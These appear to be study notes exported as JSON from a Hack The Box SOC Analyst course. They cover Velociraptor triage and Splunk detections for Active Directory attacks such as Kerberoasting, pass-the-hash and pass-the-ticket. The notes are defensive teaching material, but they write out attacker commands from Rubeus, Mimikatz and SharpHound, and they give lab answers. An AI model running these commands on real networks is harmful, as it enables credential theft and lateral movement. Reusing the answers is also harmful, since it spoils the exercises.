-c\n\n$time1 = [DateTime]::ParseExact(\"2023-08-10 09:00:00.000000\", \"yyyy-MM-dd HH:mm:ss.ffffff\", $null)\n\n$time2 = [DateTime]::ParseExact(\"2023-08-10 10:00:00.000000\", \"yyyy-MM-dd HH:mm:ss.ffffff\", $null)\n\nImport-Csv -Path C:\\Users\\johndoe\\Desktop\\usn_output.csv | Where-Object { $_.'FileName' -match '\\.exe$|\\.txt$|\\.msi$|\\.bat$|\\.ps1$|\\.iso$|\\.lnk$' } | Where-Object { $_.timestamp -as [DateTime] -ge $time1 -and $_.timestamp -as [DateTime] -lt $time2 }\n</code></pre>"}, {"location": "HTB/Academy/SOC%20Analyst/#skills-assessment_2", "title": "Skills Assessment", "text": "<p>Q1: Using VAD analysis, pinpoint the suspicious process and enter its name as your answer. Answer format: _.exe</p> <p><code>Windows.System.VAD</code></p> <p>Check for processes with memory sections marked as <code>EXECUTE_READWRITE</code> or suspicious permissions.</p> <p>Cross-refrence:  <code>Windows.System.PsList</code></p> <p>Search for strings not contain <code>Windows</code>: <code>^(?!.*Windows).*</code></p> <pre><code>\"ProtectionMsg\":\"PAGE_EXECUTE_READWRITE\",\n\n{\"Pid\":8244,\"Ppid\":6548,\"TokenIsElevated\":true,\"Name\":\"reverse.exe\",\"CommandLine\":\"\\\"C:\\\\Users\\\\j0seph\\\\AppData\\\\Local\\\\reverse.exe\\\" \n</code></pre> <p>reverse.exe</p> <p>Q2: Determine the IP address of the C2 (Command and Control) server and enter it as your answer.</p> <p><code>Windows.Network.Netstat</code></p> <pre><code>{\"Pid\":7924,\"Name\":\"reverse.exe\",\"Family\":\"IPv4\",\"Type\":\"TCP\",\"Status\":\"SENT\",\"Laddr.IP\":\"10.129.228.172\",\"Laddr.Port\":57265,\"Raddr.IP\":\"3.19.219.4\",\"Raddr.Port\":80,\"Timestamp\":\"2025-01-22T04:59:57Z\"}\n</code></pre> <p>Q3: Determine the registry key used for persistence and enter it as your answer.</p> <p>https://docs.velociraptor.app/artifact_references/</p> <p><code>Windows.Registry.WDigest</code></p> <p>The Windows Registry is a database of low-level operating systems and application settings. The Run keys are specific keys within the Registry that contain a path that runs every time a user logs on, and they are listed below:</p> <ul> <li> <p>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run \u2014 Run path when the current user logs in</p> </li> <li> <p>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run \u2014 Run path when any user logs in</p> </li> <li> <p>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce \u2014 Run path when the current user logs in, then delete</p> </li> <li> <p>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce \u2014 Run path when any user logs in, then delete</p> </li> </ul> <p>Q4: Determine the folder that contains all Mimikatz-related files and enter the full path as your answer.</p> <p><code>Windows.Search.FileFinder</code></p> <p>Change the configuration multiple times to find the right folder.</p> <p><code>C:\\Users\\j0seph\\AppData\\Local\\mimik</code></p> <p>Q5: Determine the Microsoft Word document that j0seph recently accessed and enter its name as your answer. Answer format: _.DOCX</p> <p><code>Windows.Forensics.Prefetch</code></p> <p>Then, search <code>docx</code> in the json file.</p> <p></p> <p>Incident Response and Threat hunting using Velociraptor \u2014 Pt.2</p>"}, {"location": "HTB/Academy/SOC%20Analyst/#detecting-windows-attacks-with-splunk", "title": "Detecting Windows Attacks with Splunk", "text": ""}, {"location": "HTB/Academy/SOC%20Analyst/#detecting-common-userdomain-recon", "title": "Detecting Common User/Domain Recon", "text": "<p>Domain Reconnaissance</p> <ul> <li>User/Domain Reconnaissance Using Native Windows Executables</li> </ul> <pre><code>whoami /all\nwmic computersystem get domain\nnet user /domain\nnet group \"Domain Admins\" /domain\narp -a\nnltest /domain_trusts\n</code></pre> <ul> <li>User/Domain Reconnaissance Using BloodHound/SharpHound</li> </ul> <p>BloodHound is an open-source domain reconnaissance tool created to analyze and visualize the Active Directory (AD) environment.</p> <p>Sharphound is a C# data collector for BloodHound. </p> <p><code>.\\SharpHound.exe -c all</code></p> <p>Under the hood, the BloodHound collector executes numerous LDAP queries directed at the Domain Controller, aiming to amass information about the domain.</p> <p>However, monitoring LDAP queries can be a challenge. By default, the Windows Event Log does not record them. The best option Windows can suggest is employing <code>Event 1644</code> - the LDAP performance monitoring log. Even with it enabled, BloodHound may not generate many of the expected events.</p> <p>A more reliable approach is to utilize the Windows ETW provider <code>Microsoft-Windows-LDAP-Client</code>. SilkETW &amp; SilkService are versatile C# wrappers for ETW, designed to simplify the intricacies of ETW, providing an accessible interface for research and introspection. <code>SilkService</code> supports output to the Windows Event Log, which streamlines log digestion. Another useful feature is the ability to employ <code>Yara</code> rules for hunting suspicious LDAP queries.</p> <p>In addition, Microsoft's ATP team has compiled a list of LDAP filters frequently used by reconnaissance tools.</p> <p>Detecting User/Domain Recon With Splunk</p> <ul> <li>Detecting Recon By Targeting Native Windows Executables</li> </ul> <p>Timeframe: <code>earliest=1690447949 latest=1690450687</code></p> <pre><code>index=main source=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" EventID=1 earliest=1690447949 latest=1690450687\n| search process_name IN (arp.exe,chcp.com,ipconfig.exe,net.exe,net1.exe,nltest.exe,ping.exe,systeminfo.exe,whoami.exe) OR (process_name IN (cmd.exe,powershell.exe) AND process IN (*arp*,*chcp*,*ipconfig*,*net*,*net1*,*nltest*,*ping*,*systeminfo*,*whoami*))\n| stats values(process) as process, min(_time) as _time by parent_process, parent_process_id, dest, user\n| where mvcount(process) &gt; 3\n</code></pre> <ul> <li>Detecting Recon By Targeting BloodHound</li> </ul> <p>Timeframe: <code>earliest=1690195896 latest=1690285475</code></p> <pre><code>index=main earliest=1690195896 latest=1690285475 source=\"WinEventLog:SilkService-Log\"\n| spath input=Message \n| rename XmlEventData.* as * \n| table _time, ComputerName, ProcessName, ProcessId, DistinguishedName, SearchFilter\n| sort 0 _time\n| search SearchFilter=\"*(samAccountType=805306368)*\"\n| stats min(_time) as _time, max(_time) as maxTime, count, values(SearchFilter) as SearchFilter by ComputerName, ProcessName, ProcessId\n| where count &gt; 10\n| convert ctime(maxTime)\n</code></pre> <p>Q: Modify and employ the Splunk search provided at the end of this section on all ingested data (All time) to find all process names that made LDAP queries where the filter includes the string <code>*(samAccountType=805306368)*</code>. Enter the missing process name from the following list as your answer. N/A, Rubeus, SharpHound, mmc, powershell, _</p> <pre><code>index=main source=\"WinEventLog:SilkService-Log\"\n| spath input=Message \n| rename XmlEventData.* as * \n| table _time, ComputerName, ProcessName, ProcessId, DistinguishedName, SearchFilter\n| sort 0 _time\n| search SearchFilter=\"*(samAccountType=805306368)*\"\n| stats min(_time) as _time, max(_time) as maxTime, count, values(SearchFilter) as SearchFilter by ComputerName, ProcessName, ProcessId\n</code></pre> <p></p>"}, {"location": "HTB/Academy/SOC%20Analyst/#detecting-password-spraying", "title": "Detecting Password Spraying", "text": "<p>Password Spraying</p> <p>Spray</p> <p>Password Spraying Detection Opportunities</p> <p>A common pattern is multiple failed logon attempts with <code>Event ID 4625 - Failed Logon</code> from different user accounts but originating from the same source IP address within a short time frame.</p> <p>Other event logs that may aid in password spraying detection include:</p> <pre><code>4768 and ErrorCode 0x6 - Kerberos Invalid Users\n4768 and ErrorCode 0x12 - Kerberos Disabled Users\n4776 and ErrorCode 0xC000006A - NTLM Invalid Users\n4776 and ErrorCode 0xC0000064 - NTLM Wrong Password\n4648 - Authenticate Using Explicit Credentials\n4771 - Kerberos Pre-Authentication Failed\n</code></pre> <p>Detecting Password Spraying With Splunk</p> <p>Timeframe: <code>earliest=1690280680 latest=1690289489</code></p> <pre><code>index=main earliest=1690280680 latest=1690289489 source=\"WinEventLog:Security\" EventCode=4625\n| bin span=15m _time\n| stats values(user) as Users, dc(user) as dc_user by src, Source_Network_Address, dest, EventCode, Failure_Reason\n</code></pre> <p>Search Breakdown:</p> <p>Filtering by Index, Source, and EventCode: The search starts by selecting events from the main index where the source is WinEventLog:Security and the EventCode is 4625. This EventCode represents failed logon attempts in the Windows Security Event Log.</p> <p>Time Range Filter: The search restricts the time range of events to those occurring between the Unix timestamps 1690280680 and 1690289489. These timestamps represent the earliest and latest times in which the events occurred.</p> <p>Time Binning: The <code>bin</code> command is used to create time buckets of 15 minutes duration for each event based on the _time field. This step groups the events into 15-minute intervals, which can be useful for analyzing patterns or trends over time.</p> <p>Statistics: The <code>stats</code> command is used to aggregate events based on the fields src, Source_Network_Address, dest, EventCode, and Failure_Reason.</p> <p>For each unique combination of these fields, the search calculates the following statistics:</p> <pre><code>values(user) as Users: All unique values of the user field within each group.\n\ndc(user) as dc_user: The distinct count of unique values of the `user` field within each group. This represents the number of different users associated with the failed logon attempts in each group.\n</code></pre>"}, {"location": "HTB/Academy/SOC%20Analyst/#detecting-responder-like-attacks", "title": "Detecting Responder-like Attacks", "text": "<p>LLMNR/NBT-NS/mDNS Poisoning</p> <p><code>LLMNR (Link-Local Multicast Name Resolution) and NBT-NS (NetBIOS Name Service) poisoning</code>, also referred to as NBNS spoofing, are network-level attacks that exploit inefficiencies in these name resolution protocols. Both <code>LLMNR</code> and <code>NBT-NS</code> are used to resolve hostnames to IP addresses on local networks when the fully qualified domain name (FQDN) resolution fails. However, their lack of built-in security mechanisms renders them susceptible to spoofing and poisoning attacks.</p> <p>Typically, attackers employ the Responder tool to execute LLMNR, NBT-NS, or mDNS poisoning.</p> <p>Responder Detection Opportunities</p> <p>Detecting LLMNR, NBT-NS, and mDNS poisoning can be challenging. However, organizations can mitigate the risk by implementing the following measures:</p> <ol> <li> <p>Deploy network monitoring solutions to detect unusual <code>LLMNR</code> and <code>NBT-NS</code> traffic patterns, such as an elevated volume of name resolution requests from a single source.</p> </li> <li> <p>Employ a honeypot approach - name resolution for non-existent hosts should fail. If an attacker is present and spoofing LLMNR/NBT-NS/mDNS responses, name resolution will succeed. https://www.praetorian.com/blog/a-simple-and-effective-way-to-detect-broadcast-name-resolution-poisoning-bnrp/</p> </li> </ol> <pre><code># A PowerShell script similar to the following can be automated to run as a scheduled task to aid in detection. \n\n$logfile = 'C:tmppoisoning.csv'\n$requestHosts = @('CORP-TX-FILE-01','COPY-NY-DC-02') #False hostnames to request\n$interval = 30 #The minimum number of seconds to wait between requests\n$jitter = 30 #The maximum value for a random number of seconds to add to the interval\nwhile($true){\n    Start-Sleep ($interval + (Get-Random ($jitter + 1)))\n    try {\n        $ErrorActionPreference = 'stop'\n        $request = Get-Random $requestHosts\n        $ipAddr = (Resolve-DnsName -LlmnrNetbiosOnly -Name $request).IPAddress.tostring()\n        $ErrorActionPreference = \"continue\"\n        $event = [pscustomobject]@{\n            date = Get-Date -format o\n            host = $env:COMPUTERNAME\n            request = $request\n            attacker_ip = $ipAddr\n            message = \"LLMNR/NBT-NS spoofing by $ipAddr detected with $request request\"\n        }\n        Write-Output $event.message\n        $event | Export-Csv -Path $logfile -Append -NoTypeInformation\n    } catch [System.Management.Automation.RuntimeException],\n[System.ComponentModel.Win32Exception] {\n    #Suppress output of timeout errors\n    } finally {\n        $ErrorActionPreference = \"continue\"\n    }\n}\n</code></pre> <pre><code>New-EventLog -LogName Application -Source LLMNRDetection\n\nWrite-EventLog -LogName Application -Source LLMNRDetection -EventId 19001 -Message $msg -EntryType Warning\n</code></pre> <p>Detecting Responder-like Attacks With Splunk</p> <p>Timeframe: <code>earliest=1690290078 latest=1690291207</code></p> <pre><code>index=main earliest=1690290078 latest=1690291207 SourceName=LLMNRDetection\n| table _time, ComputerName, SourceName, Message\n</code></pre> <p>Sysmon Event ID 22 can also be utilized to track DNS queries associated with non-existent/mistyped file shares.</p> <pre><code>index=main earliest=1690290078 latest=1690291207 EventCode=22 \n| table _time, Computer, user, Image, QueryName, QueryResults\n</code></pre> <p>Additionally, remember that Event 4648 can be used to detect explicit logons to rogue file shares which attackers might use to gather legitimate user credentials.</p> <pre><code>index=main earliest=1690290814 latest=1690291207 EventCode IN (4648) \n| table _time, EventCode, source, name, user, Target_Server_Name, Message\n| sort 0 _time\n</code></pre> <p>Q: Modify and employ the provided Sysmon Event 22-based Splunk search on all ingested data (All time) to identify all share names whose location was spoofed by 10.10.0.221. Enter the missing share name from the following list as your answer. myshare, myfileshar3, _</p> <pre><code>index=main EventCode=22 QueryResults=\"*10.10.0.221*\"\n| table _time, Computer, user, Image, QueryName, QueryResults\n</code></pre>"}, {"location": "HTB/Academy/SOC%20Analyst/#detecting-kerberoastingas-reproasting", "title": "Detecting Kerberoasting/AS-REProasting", "text": "<p><code>Kerberoasting</code> is a technique targeting service accounts in Active Directory environments to extract and crack their password hashes.</p> <p>An example of a Kerberoasting attack is using the Rubeus <code>kerberoast</code> module.</p> <p><code>.\\Rubeus.exe kerberoast</code></p> <p>Kerberoasting Attack Steps:</p> <ol> <li> <p>Identify Target Service Accounts: The attacker enumerates Active Directory to identify service accounts with <code>Service Principal Names (SPNs)</code> set. Service accounts are often associated with services running on the network, such as SQL Server, Exchange, or other applications. The following is a code snippet from <code>Rubeus</code> that is related to this step.</p> </li> <li> <p>Request TGS Tickets: The attacker uses the identified service accounts to request <code>Ticket Granting Service (TGS)</code> tickets from the <code>Key Distribution Center (KDC)</code>. These TGS tickets contain encrypted service account password hashes. The following is a code snippet from <code>Rubeus</code> that is related to this step.</p> </li> <li> <p>Offline Brute-Force Attack: The attacker employs offline brute-force techniques, utilizing password cracking tools like <code>Hashcat</code> or <code>John the Ripper</code>, to attempt to crack the encrypted password hashes.</p> </li> </ol> <p>During the Kerberos authentication process, several security-related events are generated in the Windows Event Log when a user connects to an MSSQL server:</p> <p><code>Event ID 4768 (Kerberos TGT Request)</code>: Occurs when the client workstation requests a TGT from the KDC, generating this event in the Security log on the domain controller.</p> <p><code>Event ID 4769 (Kerberos Service Ticket Request)</code>: Generated after the client receives the TGT and requests a TGS for the MSSQL server's SPN.</p> <p><code>Event ID 4624 (Logon)</code>: Logged in the Security log on the MSSQL server, indicating a successful logon once the client initiates a connection to the MSSQL server and logs in using the service account with the SPN to establish the connection.</p> <p>Kerberoasting Detection Opportunities</p> <p>Detection logic entails finding all events for TGS requests and logon events from the same user, then identifying instances where a TGS request is present without a subsequent logon event. In the case of IIS service access using a service account with an SPN, an additional <code>4648 (A logon was attempted using explicit credentials)</code> event will be generated as a logon event.</p> <p>Detecting Kerberoasting With Splunk</p> <ul> <li>Benign TGS Requests</li> </ul> <pre><code>index=main earliest=1690388417 latest=1690388630 EventCode=4648 OR (EventCode=4769 AND service_name=iis_svc) \n| dedup RecordNumber \n| rex field=user \"(?&lt;username&gt;[^@]+)\"\n| table _time, ComputerName, EventCode, name, username, Account_Name, Account_Domain, src_ip, service_name, Ticket_Options, Ticket_Encryption_Type, Target_Server_Name, Additional_Information\n</code></pre> <p>Search Breakdown:</p> <p><code>index=main earliest=1690388417 latest=1690388630</code>: This filters the search to only include events from the main index that occurred between the specified earliest and latest epoch timestamps.</p> <p><code>EventCode=4648 OR (EventCode=4769 AND service_name=iis_svc)</code>: This further filters the search to only include events with an EventCode of 4648 or an EventCode of 4769 with a service_name of iis_svc.</p> <p><code>| dedup RecordNumber</code>: This removes duplicate events based on the <code>RecordNumber</code> field.</p> <p><code>| rex field=user \"(?&lt;username&gt;[^@]+)\"</code>: This extracts the <code>username</code> portion of the <code>user</code> field using a regular expression and stores it in a new field called <code>username</code>.</p> <p><code>| table _time, ComputerName, EventCode, name, username, Account_Name, Account_Domain, src_ip, service_name, Ticket_Options, Ticket_Encryption_Type, Target_Server_Name, Additional_Information</code>: This displays the specified fields in tabular format.</p> <ul> <li>Detecting Kerberoasting - SPN Querying</li> </ul> <pre><code>index=main earliest=1690448444 latest=1690454437 source=\"WinEventLog:SilkService-Log\" \n| spath input=Message \n| rename XmlEventData.* as * \n| table _time, ComputerName, ProcessName, DistinguishedName, SearchFilter \n| search SearchFilter=\"*(&amp;(samAccountType=805306368)(servicePrincipalName=*)*\"\n</code></pre> <ul> <li>Detecting Kerberoasting - TGS Requests</li> </ul> <pre><code>index=main earliest=1690450374 latest=1690450483 EventCode=4648 OR (EventCode=4769 AND service_name=iis_svc)\n| dedup RecordNumber\n| rex field=user \"(?&lt;username&gt;[^@]+)\"\n| bin span=2m _time \n| search username!=*$ \n| stats values(EventCode) as Events, values(service_name) as service_name, values(Additional_Information) as Additional_Information, values(Target_Server_Name) as Target_Server_Name by _time, username\n| where !match(Events,\"4648\")\n</code></pre> <p><code>| search username!=*$</code>: Filters out events where the <code>username</code> field ends with a <code>$</code>.</p> <p><code>| where !match(Events,\"4648\")</code>: Filters out events that have the value <code>4648</code> in the <code>Events</code> field.</p> <ul> <li>Detecting Kerberoasting Using Transactions - TGS Requests</li> </ul> <pre><code>index=main earliest=1690450374 latest=1690450483 EventCode=4648 OR (EventCode=4769 AND service_name=iis_svc)\n| dedup RecordNumber\n| rex field=user \"(?&lt;username&gt;[^@]+)\"\n| search username!=*$ \n| transaction username keepevicted=true maxspan=5s endswith=(EventCode=4648) startswith=(EventCode=4769) \n| where closed_txn=0 AND EventCode = 4769\n| table _time, EventCode, service_name, username\n</code></pre> <p><code>| transaction username keepevicted=true maxspan=5s endswith=(EventCode=4648) startswith=(EventCode=4769)</code>: Groups events into <code>transactions</code> based on the <code>username</code> field. The <code>keepevicted=true</code> option includes events that do not meet the transaction criteria. The <code>maxspan=5s</code>option sets the maximum time duration of a transaction to 5 seconds. The <code>endswith=(EventCode=4648)</code> and <code>startswith=(EventCode=4769)</code> options specify that transactions should start with an event with <code>EventCode 4769</code> and end with an event with <code>EventCode 4648</code>.</p> <p><code>| where closed_txn=0 AND EventCode = 4769</code>: Filters the results to only include transactions that are not closed (<code>closed_txn=0</code>) and have an <code>EventCode</code> of <code>4769</code>.</p> <p>AS-REPRoasting</p> <p><code>ASREPRoasting</code> is a technique used in Active Directory environments to target user accounts without pre-authentication enabled.</p> <p><code>.\\Rubeus.exe asreproast</code></p> <p>ASREPRoasting Attack Steps:</p> <ol> <li> <p>Identify Target User Accounts: The attacker identifies user accounts without pre-authentication enabled. The following is a code snippet from <code>Rubeus</code> that is related to this step.</p> </li> <li> <p>Request AS-REQ Service Tickets: The attacker initiates an AS-REQ service ticket request for each identified target user account. The following is a code snippet from Rubeus that is related to this step.</p> </li> <li> <p>Offline Brute-Force Attack: The attacker captures the encrypted TGTs and employs offline brute-force techniques to attempt to crack the password hashes.</p> </li> </ol> <p>Kerberos pre-authentication is an additional security mechanism in the Kerberos authentication protocol enhancing user credentials protection during the authentication process. When a user tries to access a network resource or service, the client sends an authentication request AS-REQ to the KDC.</p> <p>If pre-authentication is enabled, this request also contains an encrypted timestamp (<code>pA-ENC-TIMESTAMP</code>). The KDC attempts to decrypt this timestamp using the user password hash and, if successful, issues a TGT to the user.</p> <p>When pre-authentication is disabled, there is no timestamp validation by the KDC, allowing users to request a TGT ticket without knowing the user password.</p> <p>AS-REPRoasting Detection Opportunities</p> <p>Kerberos authentication <code>Event ID 4768 (TGT Request)</code> contains a <code>PreAuthType</code> attribute in the additional information part of the event indicating whether pre-authentication is enabled for an account.</p> <p>Detecting AS-REPRoasting With Splunk</p> <ul> <li>Detecting AS-REPRoasting - Querying Accounts With Pre-Auth Disabled</li> </ul> <pre><code>index=main earliest=1690392745 latest=1690393283 source=\"WinEventLog:SilkService-Log\" \n| spath input=Message \n| rename XmlEventData.* as * \n| table _time, ComputerName, ProcessName, DistinguishedName, SearchFilter \n| search SearchFilter=\"*(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)*\"\n</code></pre> <ul> <li>Detecting AS-REPRoasting - TGT Requests For Accounts With Pre-Auth Disabled</li> </ul> <pre><code>index=main earliest=1690392745 latest=1690393283 source=\"WinEventLog:Security\" EventCode=4768 Pre_Authentication_Type=0\n| rex field=src_ip \"(\\:\\:ffff\\:)?(?&lt;src_ip&gt;[0-9\\.]+)\"\n| table _time, src_ip, user, Pre_Authentication_Type, Ticket_Options, Ticket_Encryption_Type\n</code></pre> <p><code>| rex field=src_ip \"(\\:\\:ffff\\:)?(?&lt;src_ip&gt;[0-9\\.]+)\"</code>: Uses a regular expression to extract the <code>src_ip</code> (source IP address) field. The expression matches an optional <code>\"::ffff:\"</code> prefix followed by an IP address in dotted decimal notation. This step handles IPv4-mapped IPv6 addresses by extracting the IPv4 portion.</p> <p>Q: Modify and employ the Splunk search provided at the \"Detecting Kerberoasting - SPN Querying\" part of this section on all ingested data (All time). Enter the name of the user who initiated the process that executed an LDAP query containing the \"(&amp;(samAccountType=805306368)(servicePrincipalName=)*\" string at 2023-07-26 16:42:44 as your answer. Answer format: CORP_</p> <pre><code>index=main source=\"WinEventLog:SilkService-Log\" \n| spath input=Message \n| rename XmlEventData.* as * \n| table _time, ComputerName, ProcessName, DistinguishedName, SearchFilter,ProcessID \n| search SearchFilter=\"*(&amp;(samAccountType=805306368)(servicePrincipalName=*)*\"\n\nindex=main ProcessId=7136 EventCode=1\n| table _time,EventCode, ProcessId, ProcessName, User\n</code></pre> <p><code>EventCode=1</code>: indicating process creation</p>"}, {"location": "HTB/Academy/SOC%20Analyst/#detecting-pass-the-hash", "title": "Detecting Pass-the-Hash", "text": "<p>Pass-the-Hash is a technique utilized by attackers to authenticate to a networked system using the <code>NTLM</code> hash of a user's password instead of the plaintext password. The attack capitalizes on the way Windows stores password hashes in memory, enabling adversaries with administrative access to capture the hash and reuse it for lateral movement within the network.</p> <p>Pass-the-Hash Attack Steps:</p> <ol> <li> <p>The attacker employs tools such as <code>Mimikatz</code> to extract the <code>NTLM</code> hash of a user currently logged onto the compromised system. Note that local administrator privileges are required on the system to extract the user's hash.</p> </li> <li> <p>Armed with the <code>NTLM</code> hash, the attacker can authenticate as the targeted user on other systems or network resources without needing to know the actual password.`</p> </li> <li> <p>Utilizing the authenticated session, the attacker can move laterally within the network, gaining unauthorized access to other systems and resources.</p> </li> </ol> <p>Windows Access Tokens &amp; Alternate Credentials</p> <p>An access token is a data structure that defines the security context of a process or thread. It contains information about the associated user account's identity and privileges.</p> <p>https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens</p> <p>Alternate Credentials provide a way to supply different login credentials (username and password) for specific actions or processes without altering the user's primary login session. This permits a user or process to execute certain commands or access resources as a different user without logging out or switching user accounts. The <code>runas</code> command is a Windows command-line tool that allows users to execute commands as another user. When the <code>runas</code> command is executed, a new access token is generated, which can be verified with the <code>whoami</code> command.</p> <p>The <code>runas</code> command also contains an interesting flag <code>/netonly</code>. This flag indicates that the specified user information is for remote access only. Even though the <code>whoami</code> command returns the original username, the spawned <code>cmd.exe</code> can still access the Domain Controller root folder.</p> <p>Pass-the-Hash Detection Opportunities</p> <ul> <li> <p>When <code>runas</code> command is executed without the <code>/netonly</code> flag - <code>Event ID 4624 (Logon)</code> with <code>LogonType 2 (interactive)</code>.</p> </li> <li> <p>When <code>runas</code> command is executed with the <code>/netonly</code> flag - <code>Event ID 4624 (Logon)</code> with <code>LogonType 9 (NewCredentials)</code>.`</p> </li> </ul> <p>The main difference between <code>runas</code> with the <code>netonly</code> flag and the <code>Pass-the-Hash</code> attack is that in the latter case, <code>Mimikatz</code> will access the <code>LSASS</code> process memory to change <code>LogonSession</code> credential materials. Thus, initial detection can be enhanced by correlating <code>User Logon with NewCredentials</code> events with <code>Sysmon Process Access Event Code 10</code>.</p> <p>Detecting Pass-the-Hash With Splunk</p> <p>Logon_Process=seclogo :</p> <p>\"The main difference to key off of is the Logon Process will always be <code>seclogo</code> for pass the hash (from my tests), so you can filter on that to reduce false-positive rates.\"</p> <pre><code>index=main earliest=1690450708 latest=1690451116 source=\"WinEventLog:Security\" EventCode=4624 Logon_Type=9 Logon_Process=seclogo\n| table _time, ComputerName, EventCode, user, Network_Account_Domain, Network_Account_Name, Logon_Type, Logon_Process\n</code></pre> <p>Enhanced search term:</p> <pre><code>index=main earliest=1690450689 latest=1690451116 (source=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=10 TargetImage=\"C:\\\\Windows\\\\system32\\\\lsass.exe\" SourceImage!=\"C:\\\\ProgramData\\\\Microsoft\\\\Windows Defender\\\\platform\\\\*\\\\MsMpEng.exe\") OR (source=\"WinEventLog:Security\" EventCode=4624 Logon_Type=9 Logon_Process=seclogo)\n| sort _time, RecordNumber\n| transaction host maxspan=1m endswith=(EventCode=4624) startswith=(EventCode=10)\n| stats count by _time, Computer, SourceImage, SourceProcessId, Network_Account_Domain, Network_Account_Name, Logon_Type, Logon_Process\n| fields - count\n</code></pre> <p>EventCode 10 (Process Access), EventCode 4624 (Logon), Logon_Type 9 (NewCredentials).</p>"}, {"location": "HTB/Academy/SOC%20Analyst/#detecting-pass-the-ticket", "title": "Detecting Pass-the-Ticket", "text": "<p>Pass-the-Ticket (PtT) is a lateral movement technique used by attackers to move laterally within a network by abusing Kerberos TGT (Ticket Granting Ticket) and TGS (Ticket Granting Service) tickets. Instead of using NTLM hashes, PtT leverages Kerberos tickets to authenticate to other systems and access network resources without needing to know the users' passwords. This technique allows attackers to move laterally and gain unauthorized access across multiple systems.</p> <p>PtT Attack Steps:</p> <ol> <li> <p>The attacker gains administrative access to a system, either through an initial compromise or privilege escalation.</p> </li> <li> <p>The attacker uses tools such as <code>Mimikatz</code> or <code>Rubeus</code> to extract valid TGT or TGS tickets from the compromised system's memory.</p> <p><code>.\\Rubeus.exe monitor /interval:30</code></p> </li> <li> <p>The attacker submits the extracted ticket for the current logon session. The attacker can now authenticate to other systems and network resources without needing plaintext passwords.</p> <p><code>.\\Rubeus.exe ptt /ticket:&lt;extracted ticket in step 2&gt;</code></p> </li> </ol> <p>Related Windows Security Events</p> <p>During user access to network resources, several Windows Event Logs are generated to record the logon process and related activities.</p> <ul> <li> <p>Event ID 4648 (Explicit Credential Logon Attempt): This event is logged when explicit credentials (e.g., username and password) are provided during logon.</p> </li> <li> <p>Event ID 4624 (Logon): This event indicates that a user has successfully logged on to the system.</p> </li> <li> <p>Event ID 4672 (Special Logon): This event is logged when a user's logon includes special privileges, such as running applications as an administrator.</p> </li> <li> <p>Event ID 4768 (Kerberos TGT Request): This event is logged when a client requests a Ticket Granting Ticket (TGT) during the Kerberos authentication process.</p> </li> <li> <p>Event ID 4769 (Kerberos Service Ticket Request): When a client requests a Service Ticket (TGS Ticket) to access a remote service during the Kerberos authentication process, Event ID 4769 is generated.</p> </li> </ul> <p>Pass-the-Ticket Detection Opportunities</p> <p>This approach can be converted into the following Splunk detection: Look for <code>Event ID 4769 (Kerberos Service Ticket Request) or Event ID 4770 (Kerberos Service Ticket was renewed)</code> without a prior <code>Event ID 4768 (Kerberos TGT Request)</code> from the same system within a specific time window.</p> <p>Another approach is looking for mismatches between Service and Host IDs (in <code>Event ID 4769</code>) and the actual Source and Destination IPs (in <code>Event ID 3</code>). Note that there will be several legitimate mismatches, but unusual hostnames or services should be investigated further.</p> <p>Also, in cases where an attacker imports a TGS ticket into the logon session, it is important to review <code>Event ID 4771 (Kerberos Pre-Authentication Failed)</code> for mismatches between Pre-Authentication type and Failure Code. For example, <code>Pre-Authentication type 2 (Encrypted Timestamp)</code> with <code>Failure Code 0x18 (Pre-authentication information was invalid)</code> would indicate that the client sent a Kerberos AS-REQ with a pre-authentication encrypted timestamp, but the KDC couldn\u2019t decrypt it.</p> <p>It is essential to understand that these detection opportunities should be enhanced with behavior-based detection. In other words, context is vital. Looking for Event IDs <code>4769</code>, <code>4770</code>, or <code>4771</code> alone will likely generate many false positives. Correlate the event logs with user and system behavior patterns, and consider whether there are any suspicious activities associated with the user or system involved in the logs.</p> <p>Detecting Pass-the-Ticket With Splunk</p> <pre><code>index=main earliest=1690392405 latest=1690451745 source=\"WinEventLog:Security\" user!=*$ EventCode IN (4768,4769,4770) \n| rex field=user \"(?&lt;username&gt;[^@]+)\"\n| rex field=src_ip \"(\\:\\:ffff\\:)?(?&lt;src_ip_4&gt;[0-9\\.]+)\"\n| transaction username, src_ip_4 maxspan=10h keepevicted=true startswith=(EventCode=4768)\n| where closed_txn=0\n| search NOT user=\"*$@*\"\n| table _time, ComputerName, username, src_ip_4, service_name, category\n</code></pre>"}, {"location": "HTB/Academy/SOC%20Analyst/#detecting-overpass-the-hash", "title": "Detecting Overpass-the-Hash", "text": "<p>Adversaries may utilize the Overpass-the-Hash technique to obtain Kerberos TGTs by leveraging stolen password hashes to move laterally within an environment or to bypass typical system access controls. Overpass-the-Hash (also known as Pass-the-Key) allows authentication to occur via Kerberos rather than NTLM. Both NTLM hashes or AES keys can serve as a basis for requesting a Kerberos TGT.</p> <p>Overpass-the-Hash Attack Steps:</p> <ol> <li> <p>The attacker employs tools such as Mimikatz to extract the NTLM hash of a user who is currently logged in to the compromised system. The attacker must have at least local administrator privileges on the system to be able to extract the hash of the user.</p> <p><code>sekurlsa::logonpasswords</code></p> </li> <li> <p>The attacker uses a tool such as Rubeus to craft a raw AS-REQ request for a specified user to request a TGT ticket. This step does not require elevated privileges on the host to request the TGT, which makes it a stealthier approach than the Mimikatz Pass-the-Hash attack.</p> <p><code>.\\Rubeus.exe asktgt /user:Administrator /domain:lab.internal.local /rc4:&lt;admin's NTLM hash extracted in step 1&gt; ptt</code></p> </li> <li> <p>Analogous to the Pass-the-Ticket technique, the attacker submits the requested ticket for the current logon session.</p> </li> </ol> <p>Overpass-the-Hash Detection Opportunities</p> <p><code>Mimikatz</code>'s Overpass-the-Hash attack leaves the same artifacts as the Pass-the-Hash attack, and can be detected using the same strategies.</p> <p><code>Rubeus</code>, however, presents a somewhat different scenario. Unless the requested TGT is used on another host, Pass-the-Ticket detection mechanisms may not be effective, as Rubeus sends an AS-REQ request directly to the Domain Controller (DC), generating <code>Event ID 4768 (Kerberos TGT 